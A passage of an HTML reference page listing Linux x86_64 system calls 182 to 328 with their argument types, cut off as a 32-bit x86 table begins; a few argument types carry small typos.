align="left">182</td><td align="left">sys_putpmsg</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">183</td><td align="left">sys_afs_syscall</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">184</td><td align="left">sys_tuxcall</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">185</td><td align="left">sys_security</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">186</td><td align="left">sys_gettid</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">187</td><td align="left">sys_readahead</td><td align="left">int fd</td><td align="left">loff_t offset</td><td align="left">size_t count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">188</td><td align="left">sys_setxattr</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left">const void *value</td><td align="left">size_t size</td><td align="left">int flags</td><td align="left"></td></tr><tr><td align="left">189</td><td align="left">sys_lsetxattr</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left">const void *value</td><td align="left">size_t size</td><td align="left">int flags</td><td align="left"></td></tr><tr><td align="left">190</td><td align="left">sys_fsetxattr</td><td align="left">int fd</td><td align="left">const char *name</td><td align="left">const void *value</td><td align="left">size_t size</td><td align="left">int flags</td><td align="left"></td></tr><tr><td align="left">191</td><td align="left">sys_getxattr</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left">void *value</td><td align="left">size_t size</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">192</td><td align="left">sys_lgetxattr</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left">void *value</td><td align="left">size_t size</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">193</td><td align="left">sys_fgetxattr</td><td align="left">int fd</td><td align="left">const har *name</td><td align="left">void *value</td><td align="left">size_t size</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">194</td><td align="left">sys_listxattr</td><td align="left">const char *pathname</td><td align="left">char *list</td><td align="left">size_t size</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">195</td><td align="left">sys_llistxattr</td><td align="left">const char *pathname</td><td align="left">char *list</td><td align="left">size_t size</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">196</td><td align="left">sys_flistxattr</td><td align="left">int fd</td><td align="left">char *list</td><td align="left">size_t size</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">197</td><td align="left">sys_removexattr</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">198</td><td align="left">sys_lremovexattr</td><td align="left">const char *pathname</td><td align="left">const char *name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">199</td><td align="left">sys_fremovexattr</td><td align="left">int fd</td><td align="left">const char *name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">200</td><td align="left">sys_tkill</td><td align="left">pid_t pid</td><td align="left">ing sig</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">201</td><td align="left">sys_time</td><td align="left">time_t *tloc</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">202</td><td align="left">sys_futex</td><td align="left">u32 *uaddr</td><td align="left">int op</td><td align="left">u32 val</td><td align="left">struct timespec *utime</td><td align="left">u32 *uaddr2</td><td align="left">u32 val3</td></tr><tr><td align="left">203</td><td align="left">sys_sched_setaffinity</td><td align="left">pid_t pid</td><td align="left">unsigned int len</td><td align="left">unsigned long *user_mask_ptr</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">204</td><td align="left">sys_sched_getaffinity</td><td align="left">pid_t pid</td><td align="left">unsigned int len</td><td align="left">unsigned long *user_mask_ptr</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">205</td><td align="left">sys_set_thread_area</td><td align="left">NOT IMPLEMENTED. Use arch_prctl</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">206</td><td align="left">sys_io_setup</td><td align="left">unsigned nr_events</td><td align="left">aio_context_t *ctxp</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">207</td><td align="left">sys_io_destroy</td><td align="left">aio_context_t ctx</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">208</td><td align="left">sys_io_getevents</td><td align="left">aio_context_t ctx_id</td><td align="left">long min_nr</td><td align="left">long nr</td><td align="left">struct io_event *events</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">209</td><td align="left">sys_io_submit</td><td align="left">aio_context_t ctx_id</td><td align="left">long nr</td><td align="left">struct iocb **iocbpp</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">210</td><td align="left">sys_io_cancel</td><td align="left">aio_context_t ctx_id</td><td align="left">struct iocb *iocb</td><td align="left">struct io_event *result</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">211</td><td align="left">sys_get_thread_area</td><td align="left">NOT IMPLEMENTED. Use arch_prctl</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">212</td><td align="left">sys_lookup_dcookie</td><td align="left">u64 cookie64</td><td align="left">long buf</td><td align="left">long len</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">213</td><td align="left">sys_epoll_create</td><td align="left">int size</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">214</td><td align="left">sys_epoll_ctl_old</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">215</td><td align="left">sys_epoll_wait_old</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">216</td><td align="left">sys_remap_file_pages</td><td align="left">unsigned long start</td><td align="left">unsigned long size</td><td align="left">unsigned long prot</td><td align="left">unsigned long pgoff</td><td align="left">unsigned long flags</td><td align="left"></td></tr><tr><td align="left">217</td><td align="left">sys_getdents64</td><td align="left">unsigned int fd</td><td align="left">struct linux_dirent64 *dirent</td><td align="left">unsigned int count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">218</td><td align="left">sys_set_tid_address</td><td align="left">int *tidptr</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">219</td><td align="left">sys_restart_syscall</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">220</td><td align="left">sys_semtimedop</td><td align="left">int semid</td><td align="left">struct sembuf *tsops</td><td align="left">unsigned nsops</td><td align="left">const struct timespec *timeout</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">221</td><td align="left">sys_fadvise64</td><td align="left">int fd</td><td align="left">loff_t offset</td><td align="left">size_t len</td><td align="left">int advice</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">222</td><td align="left">sys_timer_create</td><td align="left">const clockid_t which_clock</td><td align="left">struct sigevent *timer_event_spec</td><td align="left">timer_t *created_timer_id</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">223</td><td align="left">sys_timer_settime</td><td align="left">timer_t timer_id</td><td align="left">int flags</td><td align="left">const struct itimerspec *new_setting</td><td align="left">struct itimerspec *old_setting</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">224</td><td align="left">sys_timer_gettime</td><td align="left">timer_t timer_id</td><td align="left">struct itimerspec *setting</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">225</td><td align="left">sys_timer_getoverrun</td><td align="left">timer_t timer_id</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">226</td><td align="left">sys_timer_delete</td><td align="left">timer_t timer_id</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">227</td><td align="left">sys_clock_settime</td><td align="left">const clockid_t which_clock</td><td align="left">const struct timespec *tp</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">228</td><td align="left">sys_clock_gettime</td><td align="left">const clockid_t which_clock</td><td align="left">struct timespec *tp</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">229</td><td align="left">sys_clock_getres</td><td align="left">const clockid_t which_clock</td><td align="left">struct timespec *tp</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">230</td><td align="left">sys_clock_nanosleep</td><td align="left">const clockid_t which_clock</td><td align="left">int flags</td><td align="left">const struct timespec *rqtp</td><td align="left">struct timespec *rmtp</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">231</td><td align="left">sys_exit_group</td><td align="left">int error_code</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">232</td><td align="left">sys_epoll_wait</td><td align="left">int epfd</td><td align="left">struct epoll_event *events</td><td align="left">int maxevents</td><td align="left">int timeout</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">233</td><td align="left">sys_epoll_ctl</td><td align="left">int epfd</td><td align="left">int op</td><td align="left">int fd</td><td align="left">struct epoll_event *event</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">234</td><td align="left">sys_tgkill</td><td align="left">pid_t tgid</td><td align="left">pid_t pid</td><td align="left">int sig</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">235</td><td align="left">sys_utimes</td><td align="left">char *filename</td><td align="left">struct timeval *utimes</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">236</td><td align="left">sys_vserver</td><td align="left">NOT IMPLEMENTED</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">237</td><td align="left">sys_mbind</td><td align="left">unsigned long start</td><td align="left">unsigned long len</td><td align="left">unsigned long mode</td><td align="left">unsigned long *nmask</td><td align="left">unsigned long maxnode</td><td align="left">unsigned flags</td></tr><tr><td align="left">238</td><td align="left">sys_set_mempolicy</td><td align="left">int mode</td><td align="left">unsigned long *nmask</td><td align="left">unsigned long maxnode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">239</td><td align="left">sys_get_mempolicy</td><td align="left">int *policy</td><td align="left">unsigned long *nmask</td><td align="left">unsigned long maxnode</td><td align="left">unsigned long addr</td><td align="left">unsigned long flags</td><td align="left"></td></tr><tr><td align="left">240</td><td align="left">sys_mq_open</td><td align="left">const char *u_name</td><td align="left">int oflag</td><td align="left">mode_t mode</td><td align="left">struct mq_attr *u_attr</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">241</td><td align="left">sys_mq_unlink</td><td align="left">const char *u_name</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">242</td><td align="left">sys_mq_timedsend</td><td align="left">mqd_t mqdes</td><td align="left">const char *u_msg_ptr</td><td align="left">size_t msg_len</td><td align="left">unsigned int msg_prio</td><td align="left">const stuct timespec *u_abs_timeout</td><td align="left"></td></tr><tr><td align="left">243</td><td align="left">sys_mq_timedreceive</td><td align="left">mqd_t mqdes</td><td align="left">char *u_msg_ptr</td><td align="left">size_t msg_len</td><td align="left">unsigned int *u_msg_prio</td><td align="left">const struct timespec *u_abs_timeout</td><td align="left"></td></tr><tr><td align="left">244</td><td align="left">sys_mq_notify</td><td align="left">mqd_t mqdes</td><td align="left">const struct sigevent *u_notification</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">245</td><td align="left">sys_mq_getsetattr</td><td align="left">mqd_t mqdes</td><td align="left">const struct mq_attr *u_mqstat</td><td align="left">struct mq_attr *u_omqstat</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">246</td><td align="left">sys_kexec_load</td><td align="left">unsigned long entry</td><td align="left">unsigned long nr_segments</td><td align="left">struct kexec_segment *segments</td><td align="left">unsigned long flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">247</td><td align="left">sys_waitid</td><td align="left">int which</td><td align="left">pid_t upid</td><td align="left">struct siginfo *infop</td><td align="left">int options</td><td align="left">struct rusage *ru</td><td align="left"></td></tr><tr><td align="left">248</td><td align="left">sys_add_key</td><td align="left">const char *_type</td><td align="left">const char *_description</td><td align="left">const void *_payload</td><td align="left">size_t plen</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">249</td><td align="left">sys_request_key</td><td align="left">const char *_type</td><td align="left">const char *_description</td><td align="left">const char *_callout_info</td><td align="left">key_serial_t destringid</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">250</td><td align="left">sys_keyctl</td><td align="left">int option</td><td align="left">unsigned long arg2</td><td align="left">unsigned long arg3</td><td align="left">unsigned long arg4</td><td align="left">unsigned long arg5</td><td align="left"></td></tr><tr><td align="left">251</td><td align="left">sys_ioprio_set</td><td align="left">int which</td><td align="left">int who</td><td align="left">int ioprio</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">252</td><td align="left">sys_ioprio_get</td><td align="left">int which</td><td align="left">int who</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">253</td><td align="left">sys_inotify_init</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">254</td><td align="left">sys_inotify_add_watch</td><td align="left">int fd</td><td align="left">const char *pathname</td><td align="left">u32 mask</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">255</td><td align="left">sys_inotify_rm_watch</td><td align="left">int fd</td><td align="left">__s32 wd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">256</td><td align="left">sys_migrate_pages</td><td align="left">pid_t pid</td><td align="left">unsigned long maxnode</td><td align="left">const unsigned long *old_nodes</td><td align="left">const unsigned long *new_nodes</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">257</td><td align="left">sys_openat</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">int mode</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">258</td><td align="left">sys_mkdirat</td><td align="left">int dfd</td><td align="left">const char *pathname</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">259</td><td align="left">sys_mknodat</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">int mode</td><td align="left">unsigned dev</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">260</td><td align="left">sys_fchownat</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">uid_t user</td><td align="left">gid_t group</td><td align="left">int flag</td><td align="left"></td></tr><tr><td align="left">261</td><td align="left">sys_futimesat</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">struct timeval *utimes</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">262</td><td align="left">sys_newfstatat</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">struct stat *statbuf</td><td align="left">int flag</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">263</td><td align="left">sys_unlinkat</td><td align="left">int dfd</td><td align="left">const char *pathname</td><td align="left">int flag</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">264</td><td align="left">sys_renameat</td><td align="left">int oldfd</td><td align="left">const char *oldname</td><td align="left">int newfd</td><td align="left">const char *newname</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">265</td><td align="left">sys_linkat</td><td align="left">int oldfd</td><td align="left">const char *oldname</td><td align="left">int newfd</td><td align="left">const char *newname</td><td align="left">int flags</td><td align="left"></td></tr><tr><td align="left">266</td><td align="left">sys_symlinkat</td><td align="left">const char *oldname</td><td align="left">int newfd</td><td align="left">const char *newname</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">267</td><td align="left">sys_readlinkat</td><td align="left">int dfd</td><td align="left">const char *pathname</td><td align="left">char *buf</td><td align="left">int bufsiz</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">268</td><td align="left">sys_fchmodat</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">mode_t mode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">269</td><td align="left">sys_faccessat</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">270</td><td align="left">sys_pselect6</td><td align="left">int n</td><td align="left">fd_set *inp</td><td align="left">fd_set *outp</td><td align="left">fd_set *exp</td><td align="left">struct timespec *tsp</td><td align="left">void *sig</td></tr><tr><td align="left">271</td><td align="left">sys_ppoll</td><td align="left">struct pollfd *ufds</td><td align="left">unsigned int nfds</td><td align="left">struct timespec *tsp</td><td align="left">const sigset_t *sigmask</td><td align="left">size_t sigsetsize</td><td align="left"></td></tr><tr><td align="left">272</td><td align="left">sys_unshare</td><td align="left">unsigned long unshare_flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">273</td><td align="left">sys_set_robust_list</td><td align="left">struct robust_list_head *head</td><td align="left">size_t len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">274</td><td align="left">sys_get_robust_list</td><td align="left">int pid</td><td align="left">struct robust_list_head **head_ptr</td><td align="left">size_t *len_ptr</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">275</td><td align="left">sys_splice</td><td align="left">int fd_in</td><td align="left">loff_t *off_in</td><td align="left">int fd_out</td><td align="left">loff_t *off_out</td><td align="left">size_t len</td><td align="left">unsigned int flags</td></tr><tr><td align="left">276</td><td align="left">sys_tee</td><td align="left">int fdin</td><td align="left">int fdout</td><td align="left">size_t len</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">277</td><td align="left">sys_sync_file_range</td><td align="left">long fd</td><td align="left">loff_t offset</td><td align="left">loff_t bytes</td><td align="left">long flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">278</td><td align="left">sys_vmsplice</td><td align="left">int fd</td><td align="left">const struct iovec *iov</td><td align="left">unsigned long nr_segs</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">279</td><td align="left">sys_move_pages</td><td align="left">pid_t pid</td><td align="left">unsigned long nr_pages</td><td align="left">const void **pages</td><td align="left">const int *nodes</td><td align="left">int *status</td><td align="left">int flags</td></tr><tr><td align="left">280</td><td align="left">sys_utimensat</td><td align="left">int dfd</td><td align="left">const char *filename</td><td align="left">struct timespec *utimes</td><td align="left">int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">281</td><td align="left">sys_epoll_pwait</td><td align="left">int epfd</td><td align="left">struct epoll_event *events</td><td align="left">int maxevents</td><td align="left">int timeout</td><td align="left">const sigset_t *sigmask</td><td align="left">size_t sigsetsize</td></tr><tr><td align="left">282</td><td align="left">sys_signalfd</td><td align="left">int ufd</td><td align="left">sigset_t *user_mask</td><td align="left">size_t sizemask</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">283</td><td align="left">sys_timerfd_create</td><td align="left">int clockid</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">284</td><td align="left">sys_eventfd</td><td align="left">unsigned int count</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">285</td><td align="left">sys_fallocate</td><td align="left">long fd</td><td align="left">long mode</td><td align="left">loff_t offset</td><td align="left">loff_t len</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">286</td><td align="left">sys_timerfd_settime</td><td align="left">int ufd</td><td align="left">int flags</td><td align="left">const struct itimerspec *utmr</td><td align="left">struct itimerspec *otmr</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">287</td><td align="left">sys_timerfd_gettime</td><td align="left">int ufd</td><td align="left">struct itimerspec *otmr</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">288</td><td align="left">sys_accept4</td><td align="left">int fd</td><td align="left">struct sockaddr *upeer_sockaddr</td><td align="left">int *upeer_addrlen</td><td align="left">int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">289</td><td align="left">sys_signalfd4</td><td align="left">int ufd</td><td align="left">sigset_t *user_mask</td><td align="left">size_t sizemask</td><td align="left">int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">290</td><td align="left">sys_eventfd2</td><td align="left">unsigned int count</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">291</td><td align="left">sys_epoll_create1</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">292</td><td align="left">sys_dup3</td><td align="left">unsigned int oldfd</td><td align="left">unsigned int newfd</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">293</td><td align="left">sys_pipe2</td><td align="left">int *filedes</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">294</td><td align="left">sys_inotify_init1</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">295</td><td align="left">sys_preadv</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left">unsigned long pos_l</td><td align="left">unsigned long pos_h</td><td align="left"></td></tr><tr><td align="left">296</td><td align="left">sys_pwritev</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left">unsigned long pos_l</td><td align="left">unsigned long pos_h</td><td align="left"></td></tr><tr><td align="left">297</td><td align="left">sys_rt_tgsigqueueinfo</td><td align="left">pid_t tgid</td><td align="left">pid_t pid</td><td align="left">int sig</td><td align="left">siginfo_t *uinfo</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">298</td><td align="left">sys_perf_event_open</td><td align="left">struct perf_event_attr *attr_uptr</td><td align="left">pid_t pid</td><td align="left">int cpu</td><td align="left">int group_fd</td><td align="left">unsigned long flags</td><td align="left"></td></tr><tr><td align="left">299</td><td align="left">sys_recvmmsg</td><td align="left">int fd</td><td align="left">struct msghdr *mmsg</td><td align="left">unsigned int vlen</td><td align="left">unsigned int flags</td><td align="left">struct timespec *timeout</td><td align="left"></td></tr><tr><td align="left">300</td><td align="left">sys_fanotify_init</td><td align="left">unsigned int flags</td><td align="left">unsigned int event_f_flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">301</td><td align="left">sys_fanotify_mark</td><td align="left">long fanotify_fd</td><td align="left">long flags</td><td align="left">__u64 mask</td><td align="left">long dfd</td><td align="left">long pathname</td><td align="left"></td></tr><tr><td align="left">302</td><td align="left">sys_prlimit64</td><td align="left">pid_t pid</td><td align="left">unsigned int resource</td><td align="left">const struct rlimit64 *new_rlim</td><td align="left">struct rlimit64 *old_rlim</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">303</td><td align="left">sys_name_to_handle_at</td><td align="left">int dfd</td><td align="left">const char *name</td><td align="left">struct file_handle *handle</td><td align="left">int *mnt_id</td><td align="left">int flag</td><td align="left"></td></tr><tr><td align="left">304</td><td align="left">sys_open_by_handle_at</td><td align="left">int dfd</td><td align="left">const char *name</td><td align="left">struct file_handle *handle</td><td align="left">int *mnt_id</td><td align="left">int flags</td><td align="left"></td></tr><tr><td align="left">305</td><td align="left">sys_clock_adjtime</td><td align="left">clockid_t which_clock</td><td align="left">struct timex *tx</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">306</td><td align="left">sys_syncfs</td><td align="left">int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">307</td><td align="left">sys_sendmmsg</td><td align="left">int fd</td><td align="left">struct mmsghdr *mmsg</td><td align="left">unsigned int vlen</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">308</td><td align="left">sys_setns</td><td align="left">int fd</td><td align="left">int nstype</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">309</td><td align="left">sys_getcpu</td><td align="left">unsigned *cpup</td><td align="left">unsigned *nodep</td><td align="left">struct getcpu_cache *unused</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">310</td><td align="left">sys_process_vm_readv</td><td align="left">pid_t pid</td><td align="left">const struct iovec *lvec</td><td align="left">unsigned long liovcnt</td><td align="left">const struct iovec *rvec</td><td align="left">unsigned long riovcnt</td><td align="left">unsigned long flags</td></tr><tr><td align="left">311</td><td align="left">sys_process_vm_writev</td><td align="left">pid_t pid</td><td align="left">const struct iovec *lvec</td><td align="left">unsigned long liovcnt</td><td align="left">const struct iovcc *rvec</td><td align="left">unsigned long riovcnt</td><td align="left">unsigned long flags</td></tr><tr><td align="left">312</td><td align="left">sys_kcmp</td><td align="left">pid_t pid1</td><td align="left">pid_t pid2</td><td align="left">int type</td><td align="left">unsigned long idx1</td><td align="left">unsigned long idx2</td><td align="left"></td></tr><tr><td align="left">313</td><td align="left">sys_finit_module</td><td align="left">int fd</td><td align="left">const char __user *uargs</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">314</td><td align="left">sys_sched_setattr</td><td align="left">pid_t pid</td><td align="left">struct sched_attr __user *attr</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">315</td><td align="left">sys_sched_getattr</td><td align="left">pid_t pid</td><td align="left">struct sched_attr __user *attr</td><td align="left">unsigned int size</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">316</td><td align="left">sys_renameat2</td><td align="left">int olddfd</td><td align="left">const char __user *oldname</td><td align="left">int newdfd</td><td align="left">const char __user *newname</td><td align="left">unsigned int flags</td><td align="left"></td></tr><tr><td align="left">317</td><td align="left">sys_seccomp</td><td align="left">unsigned int op</td><td align="left">unsigned int flags</td><td align="left">const char __user *uargs</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">318</td><td align="left">sys_getrandom</td><td align="left">char __user *buf</td><td align="left">size_t count</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">319</td><td align="left">sys_memfd_create</td><td align="left">const char __user *uname_ptr</td><td align="left">unsigned int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">320</td><td align="left">sys_kexec_file_load</td><td align="left">int kernel_fd</td><td align="left">int initrd_fd</td><td align="left">unsigned long cmdline_len</td><td align="left">const char __user *cmdline_ptr</td><td align="left">unsigned long flags</td><td align="left"></td></tr><tr><td align="left">321</td><td align="left">sys_bpf</td><td align="left">int cmd</td><td align="left">union bpf_attr *attr</td><td align="left">unsigned int size</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">322</td><td align="left">stub_execveat</td><td align="left">int dfd</td><td align="left">const char __user *filename</td><td align="left">const char __user *const __user *argv</td><td align="left">const char __user *const __user *envp</td><td align="left">int flags</td><td align="left"></td></tr><tr><td align="left">323</td><td align="left">userfaultfd</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">324</td><td align="left">membarrier</td><td align="left">int cmd</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">325</td><td align="left">mlock2</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">326</td><td align="left">copy_file_range</td><td align="left">int fd_in</td><td align="left">loff_t __user *off_in</td><td align="left">int fd_out</td><td align="left">loff_t __user * off_out</td><td align="left">size_t len</td><td align="left">unsigned int flags</td></tr><tr><td align="left">327</td><td align="left">preadv2</td><td align="left">unsigned long fd</td><td align="left">const struct iovec __user *vec</td><td align="left">unsigned long vlen</td><td align="left">unsigned long pos_l</td><td align="left">unsigned long pos_h</td><td align="left">int flags</td></tr><tr><td align="left">328</td><td align="left">pwritev2</td><td align="left">unsigned long fd</td><td align="left">const struct iovec __user *vec</td><td align="left">unsigned long vlen</td><td align="left">unsigned long pos_l</td><td align="left">unsigned long pos_h</td><td align="left">int flags</td></tr></tbody></table><h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><table><thead><tr><th>#</th><th>Name</th><th>Registers</th><th></th><th></th><th></th><th></th><th></th><th>Definition</th></tr></thead><tbody><tr><td></td><td></td><td>eax</td><td>ebx</td><td>ecx</td><td>edx</td><td>esi</td><td>edi</td><td></td></tr><tr><td>0</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/restart_syscall.2.html" target="_blank" 